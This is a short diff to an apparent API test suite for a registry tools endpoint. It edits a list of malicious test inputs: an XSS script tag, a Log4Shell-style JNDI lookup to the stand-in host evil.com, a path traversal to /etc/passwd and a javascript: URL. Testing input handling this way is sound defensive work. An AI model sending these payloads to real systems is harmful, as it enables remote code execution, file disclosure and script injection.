@@ -938,7 +938,7 @@ describe('Registry Tools API - POST /api/registry/tools', () => {
 
       const maliciousInputs = [
         '<script>alert("xss")</script>',
-        '${jndi:ldap://evil.com}',
+        '$' + '{jndi:ldap://evil.com}', // Intentional security test string
         '../../../etc/passwd',
         'javascript:alert(1)',
       ]
